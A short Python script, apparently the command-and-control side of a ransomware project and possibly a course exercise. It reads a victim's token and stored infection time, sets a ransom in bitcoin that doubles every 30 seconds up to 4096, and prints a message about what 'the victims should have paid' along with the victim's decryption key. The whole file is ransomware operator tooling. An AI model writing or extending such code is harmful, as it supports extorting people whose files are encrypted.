import base64
import os
import time

CNC_FOLDER = "cnc_data/"
DOUBLE_TIME = 30
MAX_PRICE = 4096

def main():
    #input a token in hexa
    input_key = input("Enter the token: ")


    path = CNC_FOLDER + input_key
    #read the timestamp
    with open(os.path.join(path, "timestamp.bin"), "rb") as timestamp_file:
        timestamp = int.from_bytes(timestamp_file.read(), byteorder="big")

    # Calculer le prix en fonction du temps écoulé
    price = 2 ** (int(time.time() - timestamp) // DOUBLE_TIME)
    if price > MAX_PRICE:
        price = MAX_PRICE

    print(f"The victims should have paid your {price} BITCOIN.")

    #read the key
    with open(os.path.join(path, "key.bin"), "rb") as key_file:
        key = key_file.read()

    #print the key
    print("The key is: " + base64.b64encode(key).decode("utf-8"))


if __name__ == "__main__":
    main()